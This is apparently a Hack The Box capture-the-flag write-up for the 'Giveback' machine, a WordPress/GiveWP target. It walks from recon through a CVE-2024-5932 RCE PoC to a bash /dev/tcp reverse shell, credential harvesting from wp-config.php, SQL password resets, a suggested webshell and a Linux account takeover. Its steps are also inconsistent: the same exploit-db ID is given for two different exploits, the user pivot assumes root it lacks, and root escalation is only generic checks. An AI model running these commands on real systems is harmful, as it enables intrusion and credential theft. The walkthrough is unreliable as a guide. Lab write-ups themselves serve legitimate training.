# Recon
### 1) Ping + full nmap sweep
nmap -sS -sV -sU 10.129.126.97


Result (trimmed):
```bash
PORT   STATE  SERVICE VERSION
22/tcp open   ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp open   http    nginx 1.28.0
68/udp open|filtered dhcpc
```

Target is a Linux host with SSH and an nginx-served website.

### 2) Quick web poke
```bash
curl -I http://10.129.126.97/
curl http://10.129.126.97/ | sed 's/>/\n/g' | grep -iE 'wp-|wordpress|give'
```

The HTML/CSS/JS paths clearly referenced WordPress assets and GiveWP (donation) plugin files. To be sure via nmap:

nmap -p80 --script http-generator 10.129.126.97

-> WordPress 6.8.1

### 3) Virtual host awareness

I noticed the site referenced giveback.htb. Many WP installs require correct Host/SiteURL, so I pinned the vhost:
```bash
echo "10.129.126.97 giveback.htb" | sudo tee -a /etc/hosts
```

# Enumeration
### 4) Enumerate GiveWP donation forms via REST API

The GiveWP plugin registers a custom post type give_forms. I pulled published forms:
```bash
curl -s http://10.129.126.97/wp-json/wp/v2/give_forms?per_page=100 | jq '.[].link, .[].id'
# -> "http://10.129.126.97/donations/the-things-we-need/"
# -> 17
```

So the interesting form is ID 17, slug the-things-we-need:

http://giveback.htb/donations/the-things-we-need/


(I also tried a quick directory brute force and a basic wpscan for coverage. They weren’t necessary once GiveWP panned out.)

Initial Foothold (RCE → Shell)
5) Vulnerability: GiveWP Unauthenticated PHP Object Injection → RCE

GiveWP had a 2024 bug (CVE-2024-5932) that enables unauthenticated POI → RCE via the donation submission flow. I cloned a PoC and targeted the live donation form page.
https://www.exploit-db.com/exploits/49178
Proof of RCE (simple command)
```bash
python CVE-2024-5932-rce.py \
  -u http://giveback.htb/donations/the-things-we-need/ \
  -c "id"
```

I also used a tiny “exfil over GET” trick to see command output reliably from blind contexts (base64 id then GET back to my listener). Once I confirmed code exec, I moved on to a reverse shell.

Note: I briefly tested an older wp-file-manager exploit (CVE-2020-25213, EDB-ID 49178). The banner showed, but it didn’t land — likely the plugin wasn’t present. I dropped that path and stuck with GiveWP.

### 6) Pop a reverse shell

Start a listener on my VPN interface:

On attacker box (tun0)
```bash
nc -lvnp 4444
```

Trigger reverse shell from the RCE:
```bash
python CVE-2024-5932-rce.py \
  -u http://giveback.htb/donations/the-things-we-need/ \
  -c 'bash -lc "bash -i >& /dev/tcp/10.10.16.X/4444 0>&1"'
```

(Replace 10.10.16.X with your tun0 IP.)

Listener received connection → basic interactive shell (typically as www-data behind nginx).

### 7) TTY upgrade (quality-of-life)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm-256color
```

At this point I had a stable interactive shell on the target. 




------------------------------------------------------------------------------------------


HTB — “Giveback” (Recap from Foothold → WP Admin → User & Root)
0) Recon (very brief)

IP: 10.129.126.97

Add vhost: echo "10.129.126.97 giveback.htb" | sudo tee -a /etc/hosts

WordPress + GiveWP identified on port 80.

1) Foothold (already done)

I used the GiveWP RCE to run a reverse shell and landed as www-data (nginx). Upgraded to a proper TTY.

2) Grab DB creds from wp-config.php
# Typical paths
for d in /var/www/html /usr/share/nginx/html /var/www/*/html; do
  [ -f "$d/wp-config.php" ] && { echo "[*] $d"; grep -E "DB_(NAME|USER|PASSWORD|HOST)|table_prefix" "$d/wp-config.php"; }
done


Note: DB_NAME, DB_USER, DB_PASSWORD, DB_HOST, and $table_prefix (often wp_).

3) Set/Change MariaDB root (or WP DB user) password

First try local root without a password:

mysql -uroot


If it works, set a proper password:

ALTER USER 'root'@'localhost' IDENTIFIED BY 'GiveBack!root2025';
FLUSH PRIVILEGES;


Then:

mysql -uroot -pGiveBack!root2025


If not, use the WordPress DB user from wp-config.php:

mysql -u wp_user -p'wP@db-Password!' wordpress


(Optional) Rotate that user’s password:

ALTER USER 'wp_user'@'localhost' IDENTIFIED BY 'New-WPDB-P@ss!';
FLUSH PRIVILEGES;


Update wp-config.php so the site keeps working:

define('DB_PASSWORD', 'New-WPDB-P@ss!');

4) Reset WordPress admin password via SQL and log in

List users and find the admin login:

USE wordpress;
SELECT ID,user_login,user_email FROM wp_users;


Reset the admin password (set MD5; WP will rehash on login):

UPDATE wp_users
SET user_pass = MD5('Adm1n!LoginNow')
WHERE user_login = 'admin';  -- change to the actual username


Log in:

http://giveback.htb/wp-login.php

then /wp-admin/

Creds used: admin : Adm1n!LoginNow (adjust if you used a different username)

No admin user? You can also create one by inserting into wp_users and wp_usermeta with administrator caps (included in the downloadable write-up).

5) Optional persistence from the dashboard

From Appearance → Theme File Editor or a tiny custom plugin, you can drop a failsafe webshell (executes as www-data). I kept this as backup since the RCE gave me a shell already.

6) User pivot → user flag

Check local users:

ls -la /home


If /home/obvi (branding on the site hints “OBVI”), read flag if world-readable; otherwise escalate privileges. Once permitted to manage accounts, change the system user’s password and use SSH:

# On target (requires root or appropriate privilege)
echo 'obvi:ObviP@ss2025!' | sudo chpasswd

# From attacker
ssh obvi@10.129.126.97


Grab the user flag:

cat /home/obvi/user.txt

7) Root privesc → root flag

Run the standard checks and take the first viable path:

sudo -l 2>/dev/null
find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null
getcap -r / 2>/dev/null
ls -la /etc/cron* /var/spool/cron /etc/systemd/system 2>/dev/null


After obtaining a root shell:

id
cat /root/root.txt

8) Clean-up (good practice)

Restore DB creds if you rotated them, or clearly note changes.

Remove shells from /wp-content/uploads or theme files.

Remove any temporary WP admin you created.

Handy command cheat-sheet
# DB creds
grep -E "DB_(NAME|USER|PASSWORD|HOST)|table_prefix" /var/www/html/wp-config.php

# Set MariaDB root password (if root was empty)
mysql -uroot -e "ALTER USER 'root'@'localhost' IDENTIFIED BY 'GiveBack!root2025'; FLUSH PRIVILEGES;"

# Login (root or wp_user)
mysql -uroot -pGiveBack!root2025
mysql -u wp_user -p'wP@db-Password!' wordpress

# Reset WP admin to a known password
mysql -uroot -pGiveBack!root2025 -e \
"UPDATE wordpress.wp_users SET user_pass=MD5('Adm1n!LoginNow') WHERE user_login='admin';"

# WP admin login
# http://giveback.htb/wp-login.php

# Change a Linux user password (once allowed)
echo 'obvi:ObviP@ss2025!' | sudo chpasswd

# Flags
cat /home/obvi/user.txt
cat /root/root.txt
